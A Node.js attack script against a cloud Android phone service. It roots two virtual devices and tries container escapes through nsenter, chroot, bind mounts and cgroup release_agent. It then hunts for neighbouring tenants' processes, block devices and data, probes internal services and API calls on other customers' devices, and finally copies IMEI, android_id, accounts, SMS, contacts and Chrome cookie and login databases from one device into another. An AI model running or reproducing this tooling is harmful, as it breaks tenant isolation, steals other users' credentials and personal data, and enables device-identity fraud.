#!/usr/bin/env node
/**
 * INDEPENDENT DEEP ENVIRONMENT SCANNER & ESCAPE TESTER
 * =====================================================
 * Built from scratch — no reference to existing tools.
 * Direct API + shell scanning to map the full environment.
 */

const fs = require('fs');
const path = require('path');

// ── Config ──
const { AK, SK, HOST, SVC, D1, D2, CT, hmacSign, api, sh, P } = require('../shared/vmos_api');
const SH = 'content-type;host;x-content-sha256;x-date';
const OUT = path.join(__dirname, '..', 'output', 'independent_scan_results');

// ── Crypto + HTTP ──

const W = ms => new Promise(r => setTimeout(r, ms));
if (!fs.existsSync(OUT)) fs.mkdirSync(OUT, { recursive: true });
const save = (f, d) => fs.writeFileSync(`${OUT}/${f}`, typeof d === 'string' ? d : JSON.stringify(d, null, 2));

const SCAN = {};

// ══════════════════════════════════════════════════════════════════════════════
// PHASE A: ENABLE ROOT + ADB ON BOTH DEVICES
// ══════════════════════════════════════════════════════════════════════════════
async function phaseA() {
  console.log('\n' + '█'.repeat(70));
  console.log('  PHASE A: ENABLE ROOT + ADB');
  console.log('█'.repeat(70));

  // Try every root method via API
  for (const pad of [D1, D2]) {
    P(`── ${pad} ──`);

    // Global root
    const r0 = await api('/vcpcloud/api/padApi/switchRoot', { padCodes: [pad], rootStatus: 1, rootType: 0 });
    P(`  switchRoot(global): ${r0.code} ${r0.msg || 'OK'}`);

    // Per-app root for shell
    const r1 = await api('/vcpcloud/api/padApi/switchRoot', { padCodes: [pad], rootStatus: 1, rootType: 1, packageName: 'com.android.shell' });
    P(`  switchRoot(shell): ${r1.code} ${r1.msg || 'OK'}`);

    // Enable ADB
    const a1 = await api('/vcpcloud/api/padApi/openOnlineAdb', { padCodes: [pad], open: 1 });
    P(`  openOnlineAdb: ${a1.code} ${a1.msg || 'OK'}`);

    const a2 = await api('/vcpcloud/api/padApi/adb', { padCode: pad, enable: 1 });
    P(`  adb info: ${a2.code} host=${a2.data?.host || '?'}:${a2.data?.port || '?'}`);

    // Verify root via shell
    const idCheck = await sh(pad, 'id; whoami; which su; ls -la /system/xbin/su /sbin/su /system/bin/su 2>/dev/null');
    P(`  Root verify: ${idCheck.slice(0, 100)}`);

    SCAN[`root_${pad}`] = { r0: r0.code, r1: r1.code, adb: a2.data, id: idCheck };
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// PHASE B: DEEP ENVIRONMENT SCAN
// ══════════════════════════════════════════════════════════════════════════════
async function phaseB() {
  console.log('\n' + '█'.repeat(70));
  console.log('  PHASE B: DEEP ENVIRONMENT SCAN');
  console.log('█'.repeat(70));

  const pad = D1;

  // B1: Kernel info
  P('[B1] Kernel...');
  const kernel = await sh(pad, 'uname -a; cat /proc/version');
  P(`  ${kernel.slice(0, 120)}`);
  SCAN.kernel = kernel;

  // B2: Process list (find all services, agents, daemons)
  P('[B2] Processes...');
  const ps = await sh(pad, 'ps -A -o pid,ppid,user,name 2>/dev/null || ps -ef 2>/dev/null', 20);
  SCAN.processes = ps;
  save('processes.txt', ps);
  P(`  ${ps.split('\n').length} processes`);

  // B3: Mount points (what filesystems are available)
  P('[B3] Mounts...');
  const mounts = await sh(pad, 'cat /proc/mounts 2>/dev/null | head -60');
  SCAN.mounts = mounts;
  save('mounts.txt', mounts);
  P(`  ${mounts.split('\n').length} mounts`);

  // B4: Block devices
  P('[B4] Block devices...');
  const blocks = await sh(pad, 'ls -la /dev/block/ 2>/dev/null; echo "=== DM ==="; ls -la /dev/block/dm-* 2>/dev/null');
  SCAN.block_devices = blocks;
  save('block_devices.txt', blocks);
  P(`  ${blocks.split('\n').length} lines`);

  // B5: Network interfaces + routes + listeners
  P('[B5] Network...');
  const net = await sh(pad, [
    'ip addr show 2>/dev/null || ifconfig',
    'echo "=== ROUTES ==="',
    'ip route show 2>/dev/null',
    'echo "=== ARP ==="',
    'cat /proc/net/arp 2>/dev/null',
    'echo "=== LISTENERS ==="',
    'ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null',
    'echo "=== DNS ==="',
    'cat /etc/resolv.conf 2>/dev/null',
    'getprop net.dns1 2>/dev/null',
    'getprop net.dns2 2>/dev/null',
  ].join('; '), 20);
  SCAN.network = net;
  save('network.txt', net);
  for (const l of net.split('\n').slice(0, 15)) P(`  ${l}`);

  // B6: Namespaces (are we in a namespace?)
  P('[B6] Namespaces...');
  const ns = await sh(pad, [
    'ls -la /proc/1/ns/ 2>/dev/null',
    'echo "=== SELF NS ==="',
    'ls -la /proc/self/ns/ 2>/dev/null',
    'echo "=== CMP ==="',
    'readlink /proc/1/ns/mnt 2>/dev/null',
    'readlink /proc/self/ns/mnt 2>/dev/null',
    'readlink /proc/1/ns/pid 2>/dev/null',
    'readlink /proc/self/ns/pid 2>/dev/null',
    'readlink /proc/1/ns/net 2>/dev/null',
    'readlink /proc/self/ns/net 2>/dev/null',
  ].join('; '), 15);
  SCAN.namespaces = ns;
  save('namespaces.txt', ns);
  for (const l of ns.split('\n')) if (l.trim()) P(`  ${l}`);

  // B7: Cgroups
  P('[B7] Cgroups...');
  const cg = await sh(pad, 'cat /proc/1/cgroup 2>/dev/null; echo "=== SELF ==="; cat /proc/self/cgroup 2>/dev/null');
  SCAN.cgroups = cg;
  save('cgroups.txt', cg);
  for (const l of cg.split('\n').slice(0, 10)) P(`  ${l}`);

  // B8: SELinux context + capabilities
  P('[B8] Security context...');
  const sec = await sh(pad, [
    'getenforce 2>/dev/null',
    'id -Z 2>/dev/null',
    'cat /proc/self/status | grep -i cap 2>/dev/null',
    'echo "=== ATTR ==="',
    'cat /proc/self/attr/current 2>/dev/null',
  ].join('; '), 15);
  SCAN.selinux = sec;
  save('security.txt', sec);
  for (const l of sec.split('\n')) if (l.trim()) P(`  ${l}`);

  // B9: Environment variables
  P('[B9] Environment...');
  const env = await sh(pad, 'cat /proc/self/environ 2>/dev/null | tr "\\0" "\\n" | head -30; echo "=== SET ==="; set 2>/dev/null | head -30');
  SCAN.environ = env;
  save('environ.txt', env);

  // B10: Available binaries for escape
  P('[B10] Available tools...');
  const tools = await sh(pad, [
    'which nsenter chroot unshare mount umount dd curl wget nc ncat socat python3 perl 2>/dev/null',
    'echo "=== SUID ==="',
    'find / -perm -4000 -type f 2>/dev/null | head -20',
    'echo "=== CAPS ==="',
    'find / -maxdepth 4 -name "getcap" 2>/dev/null',
  ].join('; '), 20);
  SCAN.tools = tools;
  save('tools.txt', tools);
  for (const l of tools.split('\n')) if (l.trim()) P(`  ${l}`);

  // B11: /proc special files
  P('[B11] /proc special...');
  const proc = await sh(pad, [
    'cat /proc/1/cmdline 2>/dev/null | tr "\\0" " "',
    'echo ""',
    'ls /proc/1/root/ 2>/dev/null | head -10',
    'echo "=== KCORE ==="',
    'ls -la /proc/kcore 2>/dev/null',
    'echo "=== SYSRQ ==="',
    'cat /proc/sys/kernel/sysrq 2>/dev/null',
    'echo "=== KEYS ==="',
    'cat /proc/keys 2>/dev/null | head -10',
  ].join('; '), 15);
  SCAN.proc_special = proc;
  save('proc_special.txt', proc);
  for (const l of proc.split('\n').slice(0, 10)) if (l.trim()) P(`  ${l}`);

  // B12: Docker/container indicators
  P('[B12] Container indicators...');
  const container = await sh(pad, [
    'cat /.dockerenv 2>/dev/null; echo "DOCKERENV:$?"',
    'cat /run/.containerenv 2>/dev/null; echo "CONTAINERENV:$?"',
    'cat /proc/1/sched 2>/dev/null | head -5',
    'echo "=== HOSTNAME ==="',
    'hostname',
    'cat /etc/hostname 2>/dev/null',
    'echo "=== INIT ==="',
    'ls -la /sbin/init /init 2>/dev/null',
    'file /init 2>/dev/null || echo "no file cmd"',
  ].join('; '), 15);
  SCAN.container_indicators = container;
  save('container_indicators.txt', container);
  for (const l of container.split('\n')) if (l.trim()) P(`  ${l}`);
}

// ══════════════════════════════════════════════════════════════════════════════
// PHASE C: CONTAINER ESCAPE TESTING
// ══════════════════════════════════════════════════════════════════════════════
async function phaseC() {
  console.log('\n' + '█'.repeat(70));
  console.log('  PHASE C: CONTAINER ESCAPE TESTING');
  console.log('█'.repeat(70));

  const pad = D1;

  // C1: nsenter into PID 1 namespace
  P('[C1] nsenter -t 1 escape...');
  const nsenter1 = await sh(pad, 'nsenter -t 1 -m -u -i -n -p -- id 2>&1');
  P(`  nsenter -t1 id: ${nsenter1}`);
  SCAN.escape_nsenter1 = nsenter1;

  if (nsenter1.includes('uid=')) {
    P('  ★ NSENTER WORKS — scanning host...');
    
    const hostInfo = await sh(pad, 'nsenter -t 1 -m -u -i -n -p -- sh -c "hostname; uname -a; whoami" 2>&1', 15);
    P(`  Host: ${hostInfo.slice(0, 100)}`);
    SCAN.host_info = hostInfo;
    
    const hostPs = await sh(pad, 'nsenter -t 1 -m -u -i -n -p -- sh -c "ps aux 2>/dev/null | head -30 || ps -ef | head -30" 2>&1', 20);
    SCAN.host_ps = hostPs;
    save('host_processes.txt', hostPs);
    P(`  Host processes: ${hostPs.split('\n').length} lines`);
    
    const hostNet = await sh(pad, 'nsenter -t 1 -m -u -i -n -p -- sh -c "ip addr; ip route; ss -tlnp 2>/dev/null | head -20" 2>&1', 15);
    SCAN.host_net = hostNet;
    save('host_network.txt', hostNet);
    
    const hostMounts = await sh(pad, 'nsenter -t 1 -m -u -i -n -p -- sh -c "cat /proc/mounts | head -40" 2>&1', 15);
    SCAN.host_mounts = hostMounts;
    save('host_mounts.txt', hostMounts);
  }

  // C2: Try different nsenter flags
  P('[C2] nsenter variations...');
  const nsVariants = [
    'nsenter -t 1 -m -- id 2>&1',
    'nsenter -t 1 -n -- id 2>&1',
    'nsenter -t 1 -p -- id 2>&1',
    'nsenter --target 1 --mount --uts --ipc --net --pid -- id 2>&1',
  ];
  for (const cmd of nsVariants) {
    const r = await sh(pad, cmd, 10);
    P(`  ${cmd.slice(0, 30)}: ${r.slice(0, 60)}`);
  }

  // C3: chroot escape
  P('[C3] chroot escape...');
  const chroot = await sh(pad, [
    'ls /proc/1/root/ 2>/dev/null | head -5',
    'echo "==="',
    'chroot /proc/1/root id 2>&1',
    'echo "==="',
    'chroot /proc/1/root ls /data/ 2>&1 | head -10',
  ].join('; '), 15);
  SCAN.escape_chroot = chroot;
  P(`  chroot: ${chroot.slice(0, 100)}`);

  // C4: /proc/sysrq-trigger
  P('[C4] sysrq...');
  const sysrq = await sh(pad, 'cat /proc/sys/kernel/sysrq 2>/dev/null; echo "="; ls -la /proc/sysrq-trigger 2>/dev/null');
  SCAN.sysrq = sysrq;
  P(`  sysrq: ${sysrq}`);

  // C5: Device nodes access
  P('[C5] Device nodes...');
  const devnodes = await sh(pad, [
    'ls -la /dev/kmsg /dev/mem /dev/kmem /dev/port 2>/dev/null',
    'echo "==="',
    'ls -la /dev/block/mmcblk* /dev/block/sd* /dev/block/vd* 2>/dev/null | head -10',
    'echo "==="',
    'ls -la /dev/block/by-name/ 2>/dev/null | head -15',
  ].join('; '), 15);
  SCAN.dev_nodes = devnodes;
  save('dev_nodes.txt', devnodes);
  for (const l of devnodes.split('\n')) if (l.trim()) P(`  ${l}`);

  // C6: Mount writeable host filesystem
  P('[C6] Mount attempts...');
  const mountAttempts = await sh(pad, [
    'mkdir -p /data/local/tmp/escape_mount 2>/dev/null',
    'mount -o bind / /data/local/tmp/escape_mount 2>&1; echo "bind_root:$?"',
    'mount -t proc none /data/local/tmp/escape_mount 2>&1; echo "mount_proc:$?"',
    'mount --bind /proc/1/root /data/local/tmp/escape_mount 2>&1; echo "bind_pid1:$?"',
    'ls /data/local/tmp/escape_mount/ 2>/dev/null | head -5',
    'umount /data/local/tmp/escape_mount 2>/dev/null',
  ].join('; '), 20);
  SCAN.mount_attempts = mountAttempts;
  P(`  ${mountAttempts.slice(0, 150)}`);

  // C7: Capabilities check
  P('[C7] Capabilities...');
  const caps = await sh(pad, [
    'cat /proc/self/status | grep -i cap',
    'echo "==="',
    'capsh --print 2>/dev/null || echo "no capsh"',
  ].join('; '), 15);
  SCAN.capabilities = caps;
  for (const l of caps.split('\n')) if (l.trim()) P(`  ${l}`);

  // C8: cgroup release_agent
  P('[C8] cgroup escape...');
  const cgEscape = await sh(pad, [
    'cat /proc/1/cgroup 2>/dev/null | head -5',
    'echo "==="',
    'find /sys/fs/cgroup -name release_agent -writable 2>/dev/null | head -5',
    'echo "==="',
    'find /sys/fs/cgroup -name notify_on_release 2>/dev/null | head -5',
    'echo "==="',
    'ls -la /sys/fs/cgroup/ 2>/dev/null | head -10',
  ].join('; '), 20);
  SCAN.cgroup_escape = cgEscape;
  save('cgroup_escape.txt', cgEscape);
  for (const l of cgEscape.split('\n').slice(0, 8)) if (l.trim()) P(`  ${l}`);

  // C9: eBPF check
  P('[C9] eBPF...');
  const ebpf = await sh(pad, [
    'ls /sys/fs/bpf/ 2>/dev/null',
    'cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null',
    'bpftool prog list 2>/dev/null | head -5 || echo "no bpftool"',
  ].join('; '), 10);
  SCAN.ebpf = ebpf;
  P(`  eBPF: ${ebpf.slice(0, 100)}`);

  // C10: unshare
  P('[C10] unshare...');
  const unshare = await sh(pad, 'unshare --mount --pid --fork -- id 2>&1', 10);
  SCAN.unshare = unshare;
  P(`  unshare: ${unshare.slice(0, 80)}`);
}

// ══════════════════════════════════════════════════════════════════════════════
// PHASE D: HOST-LEVEL SCAN (IF ESCAPE WORKED)
// ══════════════════════════════════════════════════════════════════════════════
async function phaseD() {
  console.log('\n' + '█'.repeat(70));
  console.log('  PHASE D: HOST-LEVEL SCAN + NEIGHBOR DISCOVERY');
  console.log('█'.repeat(70));

  const pad = D1;
  const nsenterWorks = SCAN.escape_nsenter1 && SCAN.escape_nsenter1.includes('uid=');

  if (!nsenterWorks) {
    P('  nsenter not available — trying alternative host access methods');

    // D-ALT1: Read host /proc directly
    P('[D-ALT1] Direct /proc/1/root access...');
    const pid1root = await sh(pad, 'ls /proc/1/root/ 2>/dev/null; ls /proc/1/root/data/ 2>/dev/null | head -10');
    SCAN.pid1_root = pid1root;
    P(`  /proc/1/root: ${pid1root.slice(0, 100)}`);

    // D-ALT2: Enumerate all PIDs
    P('[D-ALT2] PID enumeration...');
    const pids = await sh(pad, [
      'for p in $(ls /proc/ 2>/dev/null | grep -E "^[0-9]+$" | sort -n | head -100); do',
      '  comm=$(cat /proc/$p/comm 2>/dev/null)',
      '  [ -n "$comm" ] && echo "PID:$p:$comm"',
      'done',
    ].join('\n'), 30);
    SCAN.all_pids = pids;
    save('all_pids.txt', pids);
    P(`  ${pids.split('\n').filter(l => l.startsWith('PID:')).length} processes`);

    // D-ALT3: Search for pad_code in /proc environ
    P('[D-ALT3] Searching /proc/*/environ for pad_code...');
    const padSearch = await sh(pad, [
      'for p in $(ls /proc/ 2>/dev/null | grep -E "^[0-9]+$" | head -200); do',
      '  e=$(cat /proc/$p/environ 2>/dev/null | tr "\\0" "\\n" | grep pad_code 2>/dev/null)',
      '  [ -n "$e" ] && echo "FOUND:$p:$e:$(cat /proc/$p/comm 2>/dev/null)"',
      'done',
    ].join('\n'), 45);
    SCAN.pad_search = padSearch;
    save('pad_search.txt', padSearch);
    for (const l of padSearch.split('\n')) if (l.includes('FOUND:')) P(`  ${l}`);

    // D-ALT4: Can we read other PIDs' root filesystem?
    P('[D-ALT4] Cross-PID filesystem access...');
    const xpid = await sh(pad, [
      'for p in 1 2 3 $(ls /proc/ | grep -E "^[0-9]+$" | tail -5); do',
      '  r=$(ls /proc/$p/root/ 2>/dev/null | head -3)',
      '  [ -n "$r" ] && echo "PID_$p:$r"',
      'done',
    ].join('\n'), 20);
    SCAN.cross_pid = xpid;
    for (const l of xpid.split('\n')) if (l.trim()) P(`  ${l}`);

    return;
  }

  // ── nsenter is available ──
  P('nsenter works — scanning host directly');

  // D1: Host filesystem structure
  P('[D1] Host filesystem...');
  const hostFs = await sh(pad, 'nsenter -t 1 -m -u -i -n -p -- sh -c "ls -la /; echo === ; df -h" 2>&1', 20);
  SCAN.host_fs = hostFs;
  save('host_filesystem.txt', hostFs);

  // D2: Find ALL containers on host
  P('[D2] Find all containers...');
  const containers = await sh(pad, [
    'nsenter -t 1 -m -u -i -n -p -- sh -c "',
    'for p in $(ls /proc/ | grep -E \\"^[0-9]+$\\" | head -500); do',
    '  e=$(cat /proc/$p/environ 2>/dev/null | tr \\"\\\\0\\" \\"\\n\\" | grep pad_code)',
    '  [ -n \\"$e\\" ] && echo \\"$p:$e:$(cat /proc/$p/comm 2>/dev/null)\\"',
    'done"',
  ].join('\n'), 60);
  SCAN.host_containers = containers;
  save('host_containers.txt', containers);
  for (const l of containers.split('\n')) if (l.trim()) P(`  ${l}`);

  // D3: Host services
  P('[D3] Host services...');
  const hostSvc = await sh(pad, 'nsenter -t 1 -m -u -i -n -p -- sh -c "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null" 2>&1', 15);
  SCAN.host_services = hostSvc;
  save('host_services.txt', hostSvc);
  for (const l of hostSvc.split('\n').slice(0, 10)) P(`  ${l}`);

  // D4: Host IP + network config
  P('[D4] Host network...');
  const hostNet = await sh(pad, 'nsenter -t 1 -m -u -i -n -p -- sh -c "ip addr; ip route" 2>&1', 15);
  SCAN.host_network_full = hostNet;
  save('host_network_full.txt', hostNet);

  // D5: Docker/containerd check
  P('[D5] Container runtime...');
  const runtime = await sh(pad, [
    'nsenter -t 1 -m -u -i -n -p -- sh -c "',
    'which docker containerd ctr crictl lxc-ls 2>/dev/null',
    'echo === ',
    'docker ps 2>/dev/null || echo NO_DOCKER',
    'ctr container list 2>/dev/null || echo NO_CTR',
    'crictl ps 2>/dev/null || echo NO_CRICTL',
    '"',
  ].join('\n'), 15);
  SCAN.container_runtime = runtime;
  P(`  Runtime: ${runtime.slice(0, 100)}`);

  // D6: Find neighbor data on disk
  P('[D6] Disk scan for neighbor data...');
  const diskScan = await sh(pad, [
    'nsenter -t 1 -m -u -i -n -p -- sh -c "',
    'find / -maxdepth 3 -name accounts_ce.db 2>/dev/null | head -10',
    'echo === ',
    'find / -maxdepth 4 -path */data/data -type d 2>/dev/null | head -10',
    '"',
  ].join('\n'), 30);
  SCAN.disk_neighbor_data = diskScan;
  save('disk_scan.txt', diskScan);
  for (const l of diskScan.split('\n')) if (l.trim()) P(`  ${l}`);
}

// ══════════════════════════════════════════════════════════════════════════════
// PHASE E: CROSS-CONTAINER ACCESS + NEIGHBOR DATA EXTRACTION
// ══════════════════════════════════════════════════════════════════════════════
async function phaseE() {
  console.log('\n' + '█'.repeat(70));
  console.log('  PHASE E: CROSS-CONTAINER DATA ACCESS');
  console.log('█'.repeat(70));

  const pad = D1;

  // E1: Try reading from second device directly via /proc
  P('[E1] Can D1 see D2 via /proc?');
  const d2search = await sh(pad, [
    'for p in $(ls /proc/ | grep -E "^[0-9]+$" | head -300); do',
    '  e=$(cat /proc/$p/environ 2>/dev/null | tr "\\0" "\\n" | grep "' + D2 + '" 2>/dev/null)',
    '  [ -n "$e" ] && echo "D2_PID:$p"',
    'done',
  ].join('\n'), 30);
  SCAN.d2_via_proc = d2search;
  P(`  D2 search: ${d2search || 'not found'}`);

  // E2: Scan all /dev/block for mountable data partitions
  P('[E2] Scanning all block devices...');
  const blkScan = await sh(pad, [
    'ls /dev/block/dm-* 2>/dev/null',
    'echo "=== OUR MOUNTS ==="',
    'cat /proc/mounts | grep dm-',
  ].join('; '), 15);
  SCAN.blk_scan = blkScan;
  save('blk_scan.txt', blkScan);

  // Parse which dm devices we use vs which exist
  const ourDm = new Set();
  const allDm = [];
  for (const l of blkScan.split('\n')) {
    const m1 = l.match(/\/dev\/block\/(dm-\d+)/);
    if (m1 && !l.includes('=== ')) allDm.push(m1[1]);
    const m2 = l.match(/\/dev\/block\/(dm-\d+)\s/);
    if (m2 && l.includes(' / ') || l.includes(' /data') || l.includes(' /system') || l.includes(' /vendor') || l.includes(' /product') || l.includes(' /odm')) {
      ourDm.add(m2[1]);
    }
  }
  const foreignDm = allDm.filter(d => !ourDm.has(d));
  P(`  Our dm: ${[...ourDm].join(', ')}`);
  P(`  All dm: ${allDm.join(', ')}`);
  P(`  Foreign dm: ${foreignDm.join(', ') || 'none'}`);

  // E3: Try mounting foreign dm devices
  if (foreignDm.length > 0) {
    P('[E3] Mounting foreign dm devices...');
    for (const dm of foreignDm.slice(0, 5)) {
      await sh(pad, 'mkdir -p /data/local/tmp/foreign 2>/dev/null', 5);
      const mount = await sh(pad, `mount -t ext4 -o ro /dev/block/${dm} /data/local/tmp/foreign 2>&1; echo "RC:$?"; ls /data/local/tmp/foreign/ 2>/dev/null | head -5`, 15);
      P(`    ${dm} ext4: ${mount.slice(0, 80)}`);
      
      if (mount.includes('RC:0')) {
        const data = await sh(pad, 'ls /data/local/tmp/foreign/data/data/ 2>/dev/null | head -10', 10);
        P(`    → data: ${data.slice(0, 80)}`);
        SCAN[`foreign_${dm}`] = { mount, data };
      }
      
      await sh(pad, 'umount /data/local/tmp/foreign 2>/dev/null', 5);

      // Try f2fs too
      const f2 = await sh(pad, `mount -t f2fs -o ro /dev/block/${dm} /data/local/tmp/foreign 2>&1; echo "RC:$?"; ls /data/local/tmp/foreign/ 2>/dev/null | head -5`, 15);
      if (f2.includes('RC:0')) {
        P(`    ${dm} f2fs: ${f2.slice(0, 80)}`);
        const data = await sh(pad, 'ls /data/local/tmp/foreign/ 2>/dev/null', 10);
        SCAN[`foreign_${dm}_f2fs`] = { mount: f2, data };
      }
      await sh(pad, 'umount /data/local/tmp/foreign 2>/dev/null', 5);
    }
  }

  // E4: Try API-level access to discover how padDetails works
  P('[E4] API enumeration depth...');
  const pd = await api('/vcpcloud/api/padApi/padDetails', { size: 5 });
  if (pd.data?.pageData) {
    for (const d of pd.data.pageData) {
      if (d.padCode !== D1 && d.padCode !== D2) {
        P(`  Neighbor: ${d.padCode} ip=${d.padIp} status=${d.padStatus}`);
        
        // Try every possible way to interact
        const tests = [
          ['syncCmd', { padCode: d.padCode, scriptContent: 'id' }],
          ['padInfo', { padCode: d.padCode }],
          ['screenshot', { padCode: d.padCode, width: 100, height: 100 }],
          ['webrtcInfo', { padCode: d.padCode }],
          ['proxyInfo', { padCodes: [d.padCode] }],
        ];
        for (const [name, body] of tests) {
          const r = await api(`/vcpcloud/api/padApi/${name}`, body, 10);
          if (r.code === 200 && r.data) {
            P(`    ★ ${name}: code=${r.code} data=${JSON.stringify(r.data).slice(0, 80)}`);
            SCAN[`neighbor_${name}_${d.padCode}`] = r.data;
          } else {
            P(`    ${name}: ${r.code} ${(r.msg || '').slice(0, 30)}`);
          }
          await W(200);
        }
        break; // test one neighbor
      }
    }
  }

  // E5: Internal network scanning from inside container
  P('[E5] Internal network scan...');
  const internalScan = await sh(pad, [
    'echo "=== NATS ==="',
    'curl -s -m5 http://192.168.200.51:8222/varz 2>/dev/null | head -c 300 || echo "NATS_UNREACHABLE"',
    'echo ""',
    'echo "=== REGISTRY ==="',
    'curl -s -m5 http://192.168.50.11:80/v2/_catalog 2>/dev/null | head -c 200 || echo "REG_UNREACHABLE"',
    'echo ""',
    'echo "=== LOCAL AGENT ==="',
    'curl -s -m3 http://127.0.0.1:8779/info 2>/dev/null | head -c 300 || echo "AGENT_UNREACHABLE"',
    'echo ""',
    'echo "=== AGENT PATHS ==="',
    'for p in /api/v1/device /api/v1/info /api/v1/exec /api/v1/shell /cmd /exec /run; do',
    '  r=$(curl -s -m2 http://127.0.0.1:8779$p 2>/dev/null | head -c 100)',
    '  [ -n "$r" ] && echo "$p: $r"',
    'done',
  ].join('\n'), 30);
  SCAN.internal_network = internalScan;
  save('internal_network.txt', internalScan);
  for (const l of internalScan.split('\n')) if (l.trim()) P(`  ${l}`);
}

// ══════════════════════════════════════════════════════════════════════════════
// PHASE F: CLONE INTO BOTH DEVICES
// ══════════════════════════════════════════════════════════════════════════════
async function phaseF() {
  console.log('\n' + '█'.repeat(70));
  console.log('  PHASE F: CLONE DATA INTO BOTH DEVICES');
  console.log('█'.repeat(70));

  // Extract full identity from D1
  P('[F1] Extracting full identity from D1...');
  const props = [
    'ro.product.model', 'ro.product.brand', 'ro.product.manufacturer',
    'ro.product.device', 'ro.product.name', 'ro.product.board',
    'ro.hardware', 'ro.serialno', 'ro.build.fingerprint',
    'ro.build.display.id', 'ro.build.id', 'ro.build.version.release',
    'ro.build.version.sdk', 'persist.sys.cloud.imeinum',
    'persist.sys.cloud.imsinum', 'persist.sys.cloud.iccidnum',
    'persist.sys.cloud.phonenum', 'persist.sys.cloud.macaddress',
    'persist.sys.cloud.gps.lat', 'persist.sys.cloud.gps.lon',
    'persist.sys.cloud.drm.id', 'persist.sys.cloud.drm.vendor',
  ];

  const extracted = {};
  for (const p of props) {
    const v = await sh(D1, `getprop "${p}"`, 8);
    if (v && !v.startsWith('[') && v.length > 0) extracted[p] = v;
  }
  const aid = await sh(D1, 'settings get secure android_id 2>/dev/null', 8);
  if (aid.match(/^[0-9a-f]+$/)) extracted['android_id'] = aid;
  
  P(`  Extracted ${Object.keys(extracted).length} properties`);
  save('extracted_identity.json', extracted);

  // Extract databases
  P('[F2] Extracting databases from D1...');
  const dbs = {};
  const dbPaths = {
    'accounts_ce': '/data/system_ce/0/accounts_ce.db',
    'contacts': '/data/data/com.android.providers.contacts/databases/contacts2.db',
    'calllog': '/data/data/com.android.providers.contacts/databases/calllog.db',
    'sms': '/data/data/com.android.providers.telephony/databases/mmssms.db',
    'chrome_webdata': '/data/data/com.android.chrome/app_chrome/Default/Web Data',
    'chrome_cookies': '/data/data/com.android.chrome/app_chrome/Default/Cookies',
    'chrome_login': '/data/data/com.android.chrome/app_chrome/Default/Login Data',
    'chrome_history': '/data/data/com.android.chrome/app_chrome/Default/History',
  };

  for (const [name, dbpath] of Object.entries(dbPaths)) {
    const b64 = await sh(D1, `base64 "${dbpath}" 2>/dev/null | head -c 100000`, 60);
    if (b64 && b64.length > 100 && !b64.startsWith('[')) {
      dbs[name] = { b64, dst: dbpath };
      save(`db_${name}.b64`, b64);
      P(`  ✓ ${name}: ${b64.length} b64`);
    }
  }

  // Inject into D2
  P('\n[F3] Injecting into D2...');
  const result = { props_ok: 0, props_fail: 0, dbs_ok: 0, dbs_fail: 0 };

  for (const [prop, val] of Object.entries(extracted)) {
    if (prop === 'android_id') {
      const r = await sh(D2, `settings put secure android_id "${val}"`, 8);
      r.startsWith('[') ? result.props_fail++ : result.props_ok++;
    } else {
      const r = await sh(D2, `setprop "${prop}" "${val.replace(/"/g, '\\"')}"`, 8);
      r.startsWith('[') ? result.props_fail++ : result.props_ok++;
    }
  }
  P(`  Properties: ${result.props_ok} OK, ${result.props_fail} FAIL`);

  for (const [name, db] of Object.entries(dbs)) {
    if (db.b64.length < 60000) {
      const r = await sh(D2, `echo '${db.b64}' | base64 -d > "${db.dst}" 2>/dev/null && echo OK`, 60);
      if (r.includes('OK')) {
        result.dbs_ok++;
        P(`  ✓ ${name}`);
      } else {
        result.dbs_fail++;
        P(`  ✗ ${name}: ${r.slice(0, 40)}`);
      }
    }
  }
  P(`  Databases: ${result.dbs_ok} OK, ${result.dbs_fail} FAIL`);

  // Verify
  P('\n[F4] Verification...');
  for (const target of [D1, D2]) {
    const v = await sh(target, [
      'echo "MODEL=$(getprop ro.product.model)"',
      'echo "IMEI=$(getprop persist.sys.cloud.imeinum)"',
      'echo "AID=$(settings get secure android_id 2>/dev/null)"',
      'echo "FP=$(getprop ro.build.fingerprint | head -c 50)"',
    ].join('; '), 15);
    P(`  ${target}:`);
    for (const l of v.split('\n')) if (l.trim()) P(`    ${l}`);
  }

  SCAN.clone_result = result;
}

// ══════════════════════════════════════════════════════════════════════════════
// MAIN
// ══════════════════════════════════════════════════════════════════════════════
async function main() {
  console.log('█'.repeat(75));
  console.log('  INDEPENDENT DEEP ENVIRONMENT SCANNER');
  console.log('  Fresh scan — no reference to existing code');
  console.log('  Devices: ' + D1 + ' / ' + D2);
  console.log('█'.repeat(75));

  await phaseA();
  await phaseB();
  await phaseC();
  await phaseD();
  await phaseE();
  await phaseF();

  // Save master report
  save('MASTER_SCAN.json', SCAN);

  console.log('\n' + '█'.repeat(75));
  console.log('  SCAN COMPLETE');
  console.log('█'.repeat(75));
  console.log(`  Results: ${OUT}/`);
  const files = fs.readdirSync(OUT);
  console.log(`  Files: ${files.length}`);
  for (const f of files) console.log(`    ${f} (${fs.statSync(`${OUT}/${f}`).size} bytes)`);
  console.log('█'.repeat(75));
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
